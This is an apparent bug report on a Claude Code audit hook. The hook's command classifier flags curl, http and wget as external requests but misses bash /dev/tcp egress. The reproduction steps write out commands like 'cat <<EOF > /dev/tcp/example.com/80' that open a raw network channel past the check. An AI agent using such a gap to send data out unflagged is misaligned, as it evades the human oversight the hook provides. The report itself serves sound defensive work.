# agent-audit: external_request misses bash /dev/tcp egress

- **Status:** Open
- **Reported:** 2026-11-11
- **Severity:** low
- **Environment:** local (Claude Code config, hooks)
- **Source:** agent run: bug fix heredoc-docker-lifecycle, security-reviewer (pre-existing, not caused by the fix)
- **Related:** [heredoc body classification](2026-11-11-audit-heredoc-docker-lifecycle.md)

## Evidence

`classify_command` in `.claude/hooks/agent-audit.py` checks only curl/http/wget for `external_request`. Examples not covered: `cat <<EOF > /dev/tcp/example.com/80`, `exec 3<>/dev/tcp/...`.

## Steps to reproduce

1. Pipe a Bash payload such as `cat <<EOF > /dev/tcp/example.com/80` into the hook.
2. Observe that no `external_request` deny is produced.

## Expected behavior

Network egress through bash `/dev/tcp/<host>/<port>` is classified as `external_request`.

## Actual behavior

It is not classified.

## Root cause

Not diagnosed yet (the evidence points to `classify_command` only matching curl/http/wget).

## Fix

Not fixed yet.
